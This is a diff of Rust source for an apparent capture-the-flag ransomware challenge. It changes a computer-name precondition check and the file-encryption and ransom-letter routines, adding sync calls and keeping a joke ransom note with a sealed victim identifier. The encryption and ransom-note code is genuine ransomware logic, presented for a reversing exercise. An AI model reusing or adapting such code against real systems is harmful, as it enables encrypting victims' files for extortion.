@@ -50,10 +50,7 @@ fn check_precondition() -> Result<()> {
     let computer_name_hash = blake3::hash(computer_name.as_bytes());
     let expected_hash: blake3::Hash = EXPECTED_COMPUTER_NAME_HASH_HEX.parse().unwrap();
     if computer_name_hash != expected_hash {
-        bail!(format!(
-            "computer name mismatches: {} vs {} (name: {})",
-            computer_name_hash, expected_hash, computer_name
-        ));
+        bail!("computer name mismatches",);
     }
 
     let user_dirs = directories::UserDirs::new().unwrap();
@@ -149,11 +146,14 @@ fn encrypt_file(path: impl AsRef<Path>, key: &PerVictimKey) -> Result<()> {
     let mut fads = File::create(&ads_path)?;
     let header = cipher::encrypt_stream(&key, &mut fin, &mut fout)?;
     fads.write_all(&header.to_vec())?;
+    fads.sync_all().ok();
+    fout.sync_all()?;
     Ok(())
 }
 
 fn drop_ransom_letter(dir: impl AsRef<Path>, key: &PerVictimKey) -> Result<()> {
-    File::create(dir.as_ref().join(RANSOM_LETTER_FILE_NAME))?.write_all(format!(r#"Good morning!
+    let mut f = File::create(dir.as_ref().join(RANSOM_LETTER_FILE_NAME))?;
+    f.write_all(format!(r#"Good morning!
 All your files are belong to us. Don't worry, they are encrypted by extremely safe modern cryptography.
 We can help you recover your files, but only after you pay us 1,000,000,007 meme gifs, and only after CTF ends.
 Complain hard in the DingTalk group (or Discord channel) if you want to get trolled, or REVERSE HARDER if you want to get your files back.
@@ -167,6 +167,7 @@ Send memes along with the victim identifier to lolnoway@pm.me.
 Your victim identifier is: {}
 
 "#, &key.seal_for_operator()).as_bytes())?;
+    f.sync_all()?;
     Ok(())
 }
 
